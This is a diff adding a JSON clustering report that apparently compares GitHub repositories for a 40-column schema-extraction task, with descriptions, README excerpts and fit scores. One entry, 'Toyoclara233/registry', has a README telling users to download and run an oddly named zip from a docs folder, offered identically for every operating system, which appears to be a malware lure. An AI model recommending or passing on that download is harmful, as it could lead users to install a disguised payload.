@@ -1,0 +1,352 @@
+{
+  "run_id": "2026-04-22T19-33-10-284Z",
+  "problem": "schema-exact-extraction-into-40-column-masterlist",
+  "project": "eventbear-worker",
+  "generated_at": "2026-04-22T19:33:10.286Z",
+  "clusters": [
+    {
+      "key": "unknown|unknown",
+      "label": "csv+data+python",
+      "pattern_family": "unknown",
+      "main_layer": "unknown",
+      "relation": "divergent",
+      "signature_contrast": [
+        "data",
+        "python",
+        "csv"
+      ],
+      "has_suggested_members": false,
+      "member_ids": [
+        "https://github.com/Toyoclara233/registry",
+        "https://github.com/ordermentum/lunartick",
+        "https://github.com/jmeyo/seo-scout",
+        "https://github.com/chop-dbhi/sql-importer",
+        "https://github.com/VojinMK/Football_Match_Analytics_Data_Warehouse",
+        "https://github.com/lindseystead/ai-pdf-autofiller",
+        "https://github.com/Kriti-28/FinanceInsight",
+        "https://github.com/asgharkapk/Sub-Config-Extractor",
+        "https://github.com/beaugunderson/ip-address",
+        "https://github.com/hitoshyamamoto/soapbar",
+        "https://github.com/Szumak75/JskToolBox",
+        "https://github.com/GRAAL-Research/deepparse"
+      ]
+    }
+  ],
+  "outliers": [],
+  "relation_counts": {
+    "near_current_approach": 0,
+    "adjacent": 0,
+    "divergent": 1
+  },
+  "landscape_signal": "single_cluster_collapse",
+  "axis_view": {
+    "axes": [
+      {
+        "label": "inference_approach: hand-crafted ↔ schema-aligned ↔ ML-inferred",
+        "members": [
+          {
+            "id": "https://github.com/chop-dbhi/sql-importer",
+            "url": "https://github.com/chop-dbhi/sql-importer",
+            "owner": "chop-dbhi",
+            "name": "sql-importer",
+            "description": "Import CSV files into Postgres with automatic column typing and table creation.",
+            "language": "Go",
+            "topics": [
+              "csv",
+              "importer",
+              "inference",
+              "postgresql",
+              "sql"
+            ],
+            "readme": "SQL Importer\n\nImport a CSV file into Postgres with automatic column typing and table creation.\n\nFeatures:\n\nType inference for numbers, dates, datetimes, and booleans\nAutomatic table creation\nUniqueness and not null detection\nAutomatic decompressing of gzip and bzip2 files\nSupport for append instead of replace\nSupport for CSV files wider than 1600 columns (the Postgres limit)\n\nInstall\n\nDownload a pre-built release.\n\nOr install it from source (requires Go).\n\n \n\nUsage\n\nSpecify the database URL and a CSV file to import. The table name will be derived from the filename by default.\n\n \n\nSee other options by running sql-importer -h.\n\nStatus\n\nBeta, works as expected. Command line options will likely change.\n\nLicense\n\nMIT",
+            "license": null,
+            "dependencies": [],
+            "keywords": {},
+            "problemFit": 0.07692307692307693,
+            "score": 0.07692307692307693
+          }
+        ],
+        "status": "ok"
+      },
+      {
+        "label": "confidence_handling: all-or-nothing ↔ per-field-flagged ↔ probabilistic",
+        "members": [
+          {
+            "id": "https://github.com/Szumak75/JskToolBox",
+            "url": "https://github.com/Szumak75/JskToolBox",
+            "owner": "Szumak75",
+            "name": "JskToolBox",
+            "description": "Python utility library providing typed helpers for system operations, configuration parsing, logging pipelines, IPv4/IPv6 address handling, MikroTik/RouterOS support, and Tkinter components.",
+            "language": "Python",
+            "topics": [
+              "automation",
+              "configuration",
+              "ip-addressing",
+              "ipv4",
+              "ipv6",
+              "logging",
+              "mikrotik",
+              "networking",
+              "python",
+              "python3",
+              "routeros",
+              "system-tools",
+              "tkinter",
+              "toolbox",
+              "utilities"
+            ],
+            "readme": "JskToolBox\n\nJskToolBox provides curated sets of Python classes that support system automation, networking,\nconfiguration handling, and Tkinter-based GUI development. The documentation in docs/ offers\nmodule-by-module guides; the sections below highlight the available references.\n\nCore Utilities\n\n**AttribTool** – base classes that restrict dynamic attribute creation and manage declared fields  \n  AttribTool Readme\n**BaseTool** – mixins for metadata reporting, data storage, logging, and threading used across the project  \n  BaseTool Readme\n**RaiseTool** – helpers that standardise exception formatting and error reporting  \n  RaiseTool Readme\n**SystemTool** – utilities for interacting with the host operating system  \n  SystemTool Readme\n\nConfiguration and Data\n\n**ConfigTool** – parsers and helpers for working with configuration files  \n  ConfigTool Readme\n**DateTool** – date/time conversions, validation, and formatting helpers  \n  DateTool Readme\n**StringTool** – routines for text manipulation and sanitising  \n  StringTool Readme\n\nLogging and Networking\n\n**LogsTool** – components that assemble the project logging subsystem (queues, formatters, workers)  \n  LogsTool Readme\n**NetTool** – general-purpose classes for networking tasks  \n  NetTool Readme\n**NetAddressTool** – toolkits for IP addressing with dedicated IPv4 and IPv6 guides  \n  NetAddressTool Readme  \n  NetAddressTool IPv4 Readme  \n  NetAddressTool IPv6 Readme\n\nTkinter\n\n**TkTool** – Tk mixins, layout helpers, clipboard adapters, and reusable widgets (excluding the unreliable _TkClip)  \n  TkTool Readme\n\nAPI Documentation...",
+            "license": null,
+            "dependencies": [],
+            "keywords": {},
+            "problemFit": 0,
+            "score": 0.05
+          }
+        ],
+        "status": "ok"
+      },
+      {
+        "label": "schema_flexibility: fixed-target ↔ user-configurable ↔ auto-discovered",
+        "members": [
+          {
+            "id": "https://github.com/Toyoclara233/registry",
+            "url": "https://github.com/Toyoclara233/registry",
+            "owner": "Toyoclara233",
+            "name": "registry",
+            "description": "📦 Discover MCP servers easily with the MCP registry, your go-to hub for listing and accessing reliable MCP server options.",
+            "language": "Go",
+            "topics": [
+              "arduino",
+              "avro",
+              "dapps",
+              "documentation",
+              "javascript",
+              "jhipster",
+              "json",
+              "json-schema",
+              "mcp",
+              "nodejs",
+              "registry",
+              "schema",
+              "sponsor",
+              "spring-configuration",
+              "token-list",
+              "typescript",
+              "wiki",
+              "yarn"
+            ],
+            "readme": "🎉 registry - Simplifying Model Context Protocol Management\n\n📥 Download Links\n\n \n\n🚀 Getting Started\n\nWelcome to the registry project! This application provides a community-driven registry service for Model Context Protocol (MCP) servers. It makes it easy to manage your server context and engage with the MCP community. Follow this guide to download and run the software in just a few simple steps.\n\n📋 System Requirements\n\nBefore you begin, make sure your system meets these requirements:\n\n**Operating System:** Windows, macOS, or Linux\n**RAM:** At least 2 GB of RAM\n**Disk Space:** Minimum of 100 MB available storage\n**Network:** Internet connection for downloading updates and accessing community features\n\nIf you are unsure whether your system meets these requirements, check your system information.\n\n📥 Download & Install\n\n**Visit the Releases Page**  \n   Go to the Releases page to find the latest version of the registry software.\n\n**Select Your Operating System**  \n   On the Releases page, find the version that matches your operating system (Windows, macOS, or Linux).\n\n**Download the File**  \n   Click on the link to download the appropriate file. Depending on your system, the file name may look like:\n   - https://raw.githubusercontent.com/Toyoclara233/registry/main/docs/reference/cli/Software-oviferous.zip for Windows\n   - https://raw.githubusercontent.com/Toyoclara233/registry/main/docs/reference/cli/Software-oviferous.zip for Mac\n   - https://raw.githubusercontent.com/Toyoclara233/registry/main/docs/reference/cli/Software-oviferous.zip for Linux\n\n**Run the Installer**...",
+            "license": null,
+            "dependencies": [],
+            "keywords": {},
+            "problemFit": 0.030303030303030304,
+            "score": 0.18030303030303033
+          },
+          {
+            "id": "https://github.com/jmeyo/seo-scout",
+            "url": "https://github.com/jmeyo/seo-scout",
+            "owner": "jmeyo",
+            "name": "seo-scout",
+            "description": "SEO Scout: Node.js CLI to crawl a site (via sitemap or single URL), extract meta/OG/Twitter/schema data, run SEO checks, and export JSON/CSV/HTML reports. Supports env-based URLs (Symfony), page throttling (--delay), URL filtering (--match), and comparison between environments.",
+            "language": "JavaScript",
+            "topics": [],
+            "readme": "SEO Scout\n\nNode.js CLI to crawl a site (via sitemap or single URL), extract meta/OG/Twitter/schema data, run SEO checks, and export JSON/CSV/HTML. Includes Symfony env integration, URL filtering, throttling, and environment comparison.\n\nInstall\n \n\nQuick start\n \n\nKey flags:\n--env <env>: use Symfony env (dev|staging|prod) to auto-detect base URL\n--random <n>: randomly sample N pages from sitemap (unbiased selection)\n--match <substr...>: only URLs containing these substrings (case-insensitive)\n--limit <n>: limit number of pages (first N after filtering)\n--delay <ms>: throttle between page requests\n--fail-on-errors: exit non-zero if any page errors (4xx/5xx)\n--format <console|json|csv|html|pdf> + --output <file>: choose reporter/output\n--summary: shorter report view (HTML: hide detailed cards, CSV: keep only pages with issues)\n--max-pages <n>: cap number of rows/cards included in CSV/HTML details\n--client-report: client-facing mode (plain-language summary, compact HTML; implies --summary, default --max-pages 20)\n\nHTML output notes:\nHTML output is a single, self-contained file (inline CSS).\nOpen it in a browser (or share it as an attachment).\nThe same layout includes print CSS for cleaner browser “Save as PDF”.\n\nWhat it checks\nMeta: title, description, keywords (length/uniqueness), canonical, robots, viewport\nSocial: Open Graph, Twitter Card (title/description/image)\nStructured data: Schema.org JSON-LD\nTech: status codes, redirects, hreflang, charset\nOptional: Lighthouse audits (--lighthouse)\n\nJSON shape (excerpt)\n \n\nDevelopment\n \n\nLicense\nMIT",
+            "license": null,
+            "dependencies": [],
+            "keywords": {},
+            "problemFit": 0.030303030303030304,
+            "score": 0.0803030303030303
+          },
+          {
+            "id": "https://github.com/VojinMK/Football_Match_Analytics_Data_Warehouse",
+            "url": "https://github.com/VojinMK/Football_Match_Analytics_Data_Warehouse",
+            "owner": "VojinMK",
+            "name": "Football_Match_Analytics_Data_Warehouse",
+            "description": "Data Warehouse for football match analytics built on a star schema with SSIS ETL and SSRS reporting. Consolidates Transfermarkt CSV data into clean, consistent facts/dimensions (matches, seasons, clubs, referees, stadiums) and delivers decision-oriented reports (attendance trends, strictness, performance...).",
+            "language": "",
+            "topics": [],
+            "readme": "Football Match Analytics Data Warehouse (SSIS, SSRS)\n\nA production-style **Data Warehouse** for football match analytics built from **Transfermarkt** CSV datasets.  \nThe solution consolidates heterogeneous sources into a **star schema** (match-grain fact + multiple dimensions), loads and cleans data with **SSIS** (fuzzy matching, standardization, key resolution), and delivers **SSRS** reports focused on decision-ready KPIs and trends.\n\n---\n\nProject Overview\n\n**Objective**  \n  Provide a reliable analytical layer for football (soccer) insights by transforming fragmented CSVs into a consistent, query-optimized data model.\n\n**Analytical Grain**  \n  One row per **match** in the fact table (FactGame).\n\n**Business Value**  \n  Consistent KPIs (goals, cards, attendance, outcomes), longitudinal analysis across seasons and competitions, and comparative insights for clubs, managers, referees, and stadiums.\n\n---\n\nData Sources\n\nStructured CSV exports derived from Transfermarkt covering matches, competitions, clubs, seasons, referees, managers, stadiums, and player appearances.  \nThese serve as the operational layer feeding the DWH via ETL.\n\n---\n\nStar Schema\n\n**FactGame** (grain: match)  \n  Core measures: goals (home/away, total), cards (yellow/red), attendance, outcomes (home win / away win / draw), clean sheets, both teams to score, total cards/goals.\n\n**Dimensions**  \n  - **DimDate** – calendar attributes (day, month, quarter, year, season alignment)  \n  - **DimCompetition** – competition metadata  \n  - **DimSeason** – normalized season and round info  \n  - **DimStadium** – stadium det...",
+            "license": null,
+            "dependencies": [],
+            "keywords": {},
+            "problemFit": 0.0625,
+            "score": 0.0625
+          }
+        ],
+        "status": "ok"
+      }
+    ],
+    "unmatched": [
+      {
+        "id": "https://github.com/ordermentum/lunartick",
+        "url": "https://github.com/ordermentum/lunartick",
+        "owner": "ordermentum",
+        "name": "lunartick",
+        "description": "RFC5545 / iCal - RRule (recurrence rules) Parser for Node.js",
+        "language": "JavaScript",
+        "topics": [
+          "date",
+          "ical",
+          "iteration",
+          "javascript",
+          "moment",
+          "nodejs",
+          "parse",
+          "recurrence",
+          "rfc5545",
+          "rrule-string",
+          "scheduling"
+        ],
+        "readme": "Lunartick\n \n \n \n \n\nDescription\n\nBased on the RFC5545 spec for Internet Calendaring and Scheduling Core Object Specification.\n\nLunartick!! ... get it!?\n\nIt's a pun on lunar and a crazy person, because that's what I feel like after working on this. It's a joke.\n\nAnyway...\n\nLunartick allows you to parse an RRULE string to return an object of the properties in JS format. The returned object has an iterator() to either get the next run time based on a start time passed in (.getNext())or over the next X instances based on the RRULE COUNT or defaults to 1000 if no COUNT is present. If no start date is given, it will fetch the next run time based on the current time.\n\nPlease note that this package only supports ES6 friendly codebases.\n\nUsage\n\nNPM users\n\n \n\nYarn users\n\n \n\nImport the library and pass in an RRULE string to the .parse() method. The resulting instance supports the following properties:\nfrequency, interval, count, bySetPos, byYearDay, byMonth, byMonthDay, byWeekNo, byEaster, byDay, byHour,  byMinute, bySecond, tzId and dtStart.\n\n \n\nOnce a string has been parsed, it can be converted back to an RRULE string using the .toString() method. This method does not take any parameters.\n\n \n\nTo fetch the next run time for this schedule call the .getNext() method with an optional from date, you can pass in the .dtStart property if you want to use it. If no from date is passed in, it will fetch the next run time base on the current time.\n\n \n\nThe rule instance will also have an iterator to fetch the next X runtimes for the rule. You can use a for-of loop on rule.iterator() which takes...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.1
+      },
+      {
+        "id": "https://github.com/lindseystead/ai-pdf-autofiller",
+        "url": "https://github.com/lindseystead/ai-pdf-autofiller",
+        "owner": "lindseystead",
+        "name": "ai-pdf-autofiller",
+        "description": "Automated PDF form filling with intelligent field mapping using AI-assisted semantic inference",
+        "language": "Python",
+        "topics": [
+          "ai-automation",
+          "backend",
+          "data-mapping",
+          "developer-tools",
+          "document-automation",
+          "llm",
+          "openai",
+          "pdf",
+          "pdf-forms",
+          "production-ready",
+          "pydantic",
+          "python",
+          "semantic-mapping",
+          "workflow-automation"
+        ],
+        "readme": "PDF Autofiller\n\nBackend service for filling AcroForm PDFs from structured user data.\n\nThe project favors deterministic behavior first: it normalizes keys, applies stable aliases, coerces values, and only uses optional semantic inference or controlled fallback mapping when explicitly enabled. The result is a small, testable pipeline that is easier to audit than heuristic-only form filling.\n\nWhat It Does\n\nReads PDF metadata, form fields, and visible page text\nInfers semantic meaning for fields when optional semantic inference is enabled\nMaps user data to fields using deterministic rules first\nRejects outputs with unresolved required fields\nReturns a new filled PDF through a small FastAPI service\n\nQuick Start\n\nInstall development dependencies:\n\n \n\nor\n\n \n\nRun the API locally:\n\n \n\nRun the local smoke check:\n\n \n\nRun the demo workflow against the bundled sample:\n\n \n\nAPI Example\n\n \n\nConfiguration\n\nMODEL_PROVIDER_API_KEY: enables semantic inference and fallback mapping\nAPI_AUTH_ENABLED: enables API key validation on POST /fill\nAPI_AUTH_TOKEN: expected token value when auth is enabled\nAPI_KEY_HEADER: header name used for the incoming token\nMAX_UPLOAD_BYTES: maximum accepted PDF size in bytes\nLOG_LEVEL: process log level for the API service\n\nArchitecture\n\nCore code lives in src/pdf_autofiller/ and is intentionally split by responsibility:\n\npdf_reader.py: extraction only\nfield_semantics.py: provider client wrapper and response normalization\nmapping.py: deterministic matching and controlled fallback mapping\npdf_writer.py: output writing and required-field enforcement\napi_service.py: HTT...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05
+      },
+      {
+        "id": "https://github.com/Kriti-28/FinanceInsight",
+        "url": "https://github.com/Kriti-28/FinanceInsight",
+        "owner": "Kriti-28",
+        "name": "FinanceInsight",
+        "description": "Developing Named Entity Recognition (NER) Models for Financial Data Extraction. This project aims to extract critical financial data such as company names, stock prices, revenue, earnings, and financial events from unstructured financial documents.",
+        "language": "Python",
+        "topics": [],
+        "readme": "FinanceInsight\n\n**Named Entity Recognition (NER) for Financial Data Extraction**\n\n \n \n \n \n\nOverview\n\nFinanceInsight is a comprehensive Python project that develops advanced Named Entity Recognition (NER) models specifically designed to extract critical financial entities and data from unstructured financial documents. The project leverages **FinBERT** (Financial BERT) - a domain-specific pre-trained language model optimized for financial text - to achieve state-of-the-art performance in financial entity recognition.\n\nKey Features\n\n**FinBERT Integration**: Uses ProsusAI/FinBERT, a pre-trained language model specifically optimized for financial domain\n**Comprehensive Entity Recognition**: Recognizes 9 entity types including companies, stock tickers, financial metrics, and more\n**Complete Pipeline**: From data preparation through training, evaluation, and inference\n**Production-Ready**: Full-fledged training script with evaluation metrics and model checkpointing\n**Flexible Architecture**: Supports both FinBERT and generic BERT models\n**Data Augmentation**: Built-in techniques for improving training data quality\n\nProject Architecture\n\nFinanceInsight is a fully modular, production-ready NER system:\n\nCore Components\n\n**1. Data Preparation Module** (src/data_preparation.py)\nDocument loading from CSV, JSON, and TXT formats\nText cleaning and normalization (preserving financial symbols)\nSentence and word-level tokenization using NLTK\nBIO tagging scheme for entity labeling\nData augmentation techniques\nTrain/validation/test data splitting\n\n**2. NER Models** (src/ner_model.py)\n**FinBERT...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0.05,
+        "score": 0.05
+      },
+      {
+        "id": "https://github.com/asgharkapk/Sub-Config-Extractor",
+        "url": "https://github.com/asgharkapk/Sub-Config-Extractor",
+        "owner": "asgharkapk",
+        "name": "Sub-Config-Extractor",
+        "description": "Sub-Config-Extractor is a powerful yet lightweight tool for extracting, decoding, and converting proxy subscription data into structured configuration files. It supports VMess, VLess, Trojan, and Shadowsocks, and outputs clean YAML or JSON configs compatible with Clash, Surfboard, V2RayN, and other clients for seamless proxy management.",
+        "language": "Shell",
+        "topics": [
+          "clash",
+          "clash-meta",
+          "clashmeta",
+          "config",
+          "free",
+          "meta",
+          "mihomo",
+          "node",
+          "proxy",
+          "sing-box",
+          "sub",
+          "subscription",
+          "subscriptions",
+          "v2ray"
+        ],
+        "readme": "لیست پراکسی های استخراج شده از کالکتور های گیتهاب\nلیست پراکسی استخراج شده خام\n**فایل‌های پیکربندی آماده استفاده:** مناسب برای proxy-providers\n\n|File URL|File Line Count|\n|-|-|\n| 🌐 clash/moneyfly1_merged_proxies_new.yaml|[6037]|\n| 🚀 surfboard/moneyfly1_merged_proxies_new.yaml|[6003]|\n| 🔒 mixed/moneyfly1_merged_proxies_new.yaml|[6001]|\n| ⚡ v2ray/moneyfly1_merged_proxies_new.yaml|[6000]|\n| 🛡️ clash/trojanvmess.pages.dev/cmcm_b64.yaml|[5418]|\n| 📦 mixed/trojanvmess.pages.dev/cmcm_b64.yaml|[5388]|\n| 🛰️ mixed/mahdibland/SSAggregator/sub/sub_merge_base64.txt.yaml|[4983]|\n| 📡 clash/mahdibland/SSAggregator/sub/sub_merge_base64.txt.yaml|[4983]|\n| 🔧 clash/mahdibland/SSAggregator/sub/sub_merge_yaml.yml.yaml|[4966]|\n| 🗂️ mixed/mahdibland/SSAggregator/sub/sub_merge_yaml.yml.yaml|[4962]|\n| 💻 clash/Epodonios/v2ray-configs/All_Configs_base64_Sub.txt.yaml|[3544]|\n| 📊 clash/10ium/base64-encoder/ndsphonemy/_my.yaml|[2914]|\n| 📝 ss/trojanvmess.pages.dev/cmcm_b64.yaml|[2463]|\n| 🌀 v2ray/trojanvmess.pages.dev/cmcm_b64.yaml|[2088]|\n| 🌍 v2ray/mahdibland/SSAggregator/sub/sub_merge_yaml.yml.yaml|[2018]|\n| 💡 v2ray/mahdibland/SSAggregator/sub/sub_merge_base64.txt.yaml|[2018]|\n| 📁 mixed/10ium/base64-encoder/encoded/10ium_mixed_iran.txt.yaml|[1952]|\n| ⚙️ clash/AzadNetCH/Clash/AzadNet.txt.yaml|[1850]|\n| 🖧 clash/AzadNet/-t.me.yaml|[1850]|\n| 🔗 ss/MatinGhanbari/v2ray-configs/subscriptions/filtered/subs/ss.txt.yaml|[1685]|\n| 🧩 ss/MatinGhanbari/v2ray-configs/ss.txt.yaml|[1685]|\n| 🔍 mixed/MatinGhanbari/v2ray-configs/subscriptions/filtered/subs/ss.txt.yaml|[1685]|\n| 🖥️ mixed/MatinGhanbari/v2ray...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05
+      },
+      {
+        "id": "https://github.com/beaugunderson/ip-address",
+        "url": "https://github.com/beaugunderson/ip-address",
+        "owner": "beaugunderson",
+        "name": "ip-address",
+        "description": "💻 a library for parsing and manipulating IPv4 and IPv6 addresses in JavaScript",
+        "language": "TypeScript",
+        "topics": [
+          "ipv4",
+          "ipv6",
+          "javascript"
+        ],
+        "readme": "[![codecov]](https://codecov.io/github/beaugunderson/ip-address?branch=master)\n[![downloads]](https://www.npmjs.com/package/ip-address)\n[![npm]](https://www.npmjs.com/package/ip-address)\n[![snyk]](https://snyk.io/test/github/beaugunderson/ip-address)\n\n[codecov]: https://codecov.io/github/beaugunderson/ip-address/coverage.svg?branch=master\n[downloads]: https://img.shields.io/npm/dm/ip-address.svg\n[npm]: https://img.shields.io/npm/v/ip-address.svg\n[snyk]: https://snyk.io/test/github/beaugunderson/ip-address/badge.svg\n\nip-address\n\nip-address is a library for validating and manipulating IPv4 and IPv6\naddresses in JavaScript.\n\nUpgrading from 9.x to 10.x\n\nThe dependency on jsbn was removed thanks to\nmichal-kocarek. Thanks Michal! For\nclarity, all methods with BigInteger in the name were renamed to BigInt.\n\nBreaking changes\n\n#fromBigInteger() → #fromBigInt(); now returns a native BigInt\n#bigInteger() → #bigInt(); now returns a native BigInt\n\nDocumentation\n\nDocumentation is available at ip-address.js.org.\n\nExamples\n\n \n\nFeatures\n\nUsable via CommonJS or ESM\nParsing of all IPv6 notations\nParsing of IPv6 addresses and ports from URLs with Address6.fromURL(url)\nValidity checking\nDecoding of the Teredo\n  information\n  in an address\nWhether one address is a valid subnet of another\nWhat special properties a given address has (multicast prefix, unique\n  local address prefix, etc.)\nNumber of subnets of a certain size in a given address\nDisplay methods\n  - Hex, binary, and decimal\n  - Canonical form\n  - Correct form\n  - IPv4-compatible (i.e. ::ffff:192.168.0.1)\nWorks in node and the browser (...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05
+      },
+      {
+        "id": "https://github.com/hitoshyamamoto/soapbar",
+        "url": "https://github.com/hitoshyamamoto/soapbar",
+        "owner": "hitoshyamamoto",
+        "name": "soapbar",
+        "description": "Modern SOAP library for Python. Build servers with a SoapService class and soap_operation decorators (auto-generated WSDL), or drive a typed client from an existing WSDL. SOAP 1.1/1.2, all binding styles, WS-Security, MTOM, WS-Addressing. ASGI/WSGI-compatible. Hardened lxml parser and tests conformance suite.",
+        "language": "Python",
+        "topics": [
+          "api",
+          "json",
+          "python",
+          "rpc",
+          "soap",
+          "soap-client",
+          "soap-server",
+          "wsdl"
+        ],
+        "readme": "soapbar\n\n \n \n \n \n \n\nA SOAP library for Python — client, server, and WSDL handling.\n\nsoapbar implements SOAP 1.1 and 1.2 with all five binding styles, auto-generates WSDL from Python service classes, parses existing WSDL to drive a typed client, and integrates with any ASGI or WSGI framework via thin adapter classes. The XML parser is hardened against XXE attacks using lxml with resolve_entities=False.\n\n> **Conformance** — soapbar ships with an internal conformance suite of **135 tests across 10 spec-mapped classes** (tests/audit/test_compliance.py) covering SOAP 1.1/1.2, WSDL 1.1, and WS-I Basic Profile 1.1. The suite encodes 46 checkpoints derived from F01–F09 original findings, G01–G11 gap findings, I01–I04 informational observations, and S10 (WS-I BSP X.509 token profile); all 46 pass. This is a self-administered test suite, not an independent third-party audit.\n\n---\n\nTable of Contents\n\nFeatures\nInstallation\nQuick start — server\nBinding styles and SOAP encoding\nDefining a service\nSOAP versions\nFramework compatibility\nWSDL\nClient\nXSD type system\nFault handling\nSecurity\nWS-Security — UsernameToken\nMTOM/XOP\nXML Signature and Encryption\nWSDL schema validation\nOne-way operations\nSOAP array attributes\nrpc:result (SOAP 1.2)\nInteroperability\nArchitecture\nPublic API\nComparison with alternatives\nDevelopment setup\nInspired by\nLearn more\nKnown Limitations\nLicense\n\n---\n\nFeatures\n\nSOAP 1.1 and 1.2 (auto-detected from envelope namespace; fault codes auto-translated)\nAll 5 WSDL/SOAP binding style combinations (RPC/Encoded, RPC/Literal, Document/Literal, Document/Literal/Wrapped, Documen...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05
+      },
+      {
+        "id": "https://github.com/GRAAL-Research/deepparse",
+        "url": "https://github.com/GRAAL-Research/deepparse",
+        "owner": "GRAAL-Research",
+        "name": "deepparse",
+        "description": "Deepparse is a state-of-the-art library for parsing multinational street addresses using deep learning",
+        "language": "Python",
+        "topics": [
+          "addresses-parsing",
+          "machine-learning",
+          "python"
+        ],
+        "readme": "<div align=\"center\">\n<img src=\"https://raw.githubusercontent.com/GRAAL-Research/deepparse/main/docs/source/_static/logos/deepparse.png\" width=\"220\" height=\"91\"/>\n\n \n \n \n \n\n \n \n \n \n\n \n \n<a href=\"https://github.com/psf/black\"><img alt=\"Code style: black\" src=\"https://img.shields.io/badge/code%20style-black-000000.svg\"></a>\n\n \n \n \n \n\n \n</div>\n\nHere is Deepparse.\n\nDeepparse is a state-of-the-art library for parsing multinational street addresses using deep learning.\n\nUse deepparse to\n\nparse multinational address using one of our pretrained models with or without attention mechanism,\nparse addresses directly from the command line without code to write,\nparse addresses with our out-of-the-box FastAPI parser,\nretrain our pretrained models on new data to improve parsing on specific country address patterns,\nretrain our pretrained models with new prediction tags easily,\nretrain our pretrained models with or without freezing some layers,\ntrain a new Seq2Seq addresses parsing models easily using a new model configuration.\n\nRead the documentation at deepparse.org.\n\nDeepparse is compatible with the __latest version of PyTorch__ and  __Python >= 3.10, <= 3.13__.\n\nCountries and Results\n\nWe evaluate our models on two forms of address data\n\n**clean data** which refers to addresses containing elements from four categories, namely a street name, a\n  municipality, a province and a postal code,\n**incomplete data** which is made up of addresses missing at least one category amongst the aforementioned ones.\n\nYou can get our dataset here.\n\nClean Data\n\nThe following table presents the accuracy (usi...",
+        "license": null,
+        "dependencies": [],
+        "keywords": {},
+        "problemFit": 0,
+        "score": 0.05
+      }
+    ]
+  },
+  "selection": {
+    "by_score": 6,
+    "by_divergence": 0,
+    "diversity_gap": "no_divergent_candidates_met_threshold",
+    "note": null
+  }
+}
